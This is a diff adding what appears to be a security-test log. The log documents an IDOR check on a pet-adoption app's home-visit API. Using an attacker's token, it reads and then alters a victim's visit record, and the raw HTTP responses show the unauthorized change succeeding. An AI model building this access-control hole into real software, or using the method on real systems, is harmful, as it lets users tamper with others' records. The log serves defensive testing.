@@ -1,0 +1,31 @@
+# IDOR C - modify another user's home visit
+# Attempted: PUT /api/homevisits/:id (victim's visit) using ATTACKER token
+# Expected when fixed: 403 (only the visit's owner / adoption staff)
+
+# victim visit id: 6ab8b72db53267666193742f
+
+## (1) GET victim visit by id (attacker token):
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 326
+ETag: W/"146-lQZTP4MNaSGmTwlGtmK0qhAiYj8"
+Date: Sun, 27 Sep 2026 06:26:53 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"_id":"6ab8b72db53267666193742f","adoptionFormId":"6ab8b72d00db8a6361e47537","adopterName":"IdorVictim","adopterEmail":"idor_victim@example.com","petName":"Rex","date":"2030-02-01T00:00:00.000Z","status":"pending","userResponse":"pending","createdAt":"2026-09-27T06:26:53.574Z","updatedAt":"2026-09-27T06:26:53.574Z","__v":0}
+
+## (2) PUT tamper victim visit (attacker token):
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 359
+ETag: W/"167-TrM+u1mwjWREZ++ZDbb6YNMwqfE"
+Date: Sun, 27 Sep 2026 06:26:53 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"_id":"6ab8b72db53267666193742f","adoptionFormId":"6ab8b72d00db8a6361e47537","adopterName":"IdorVictim","adopterEmail":"idor_victim@example.com","petName":"Rex","date":"2030-02-01T00:00:00.000Z","status":"cancelled","userResponse":"pending","createdAt":"2026-09-27T06:26:53.574Z","updatedAt":"2026-09-27T06:26:53.869Z","__v":0,"notes":"HIJACKED by attacker"}
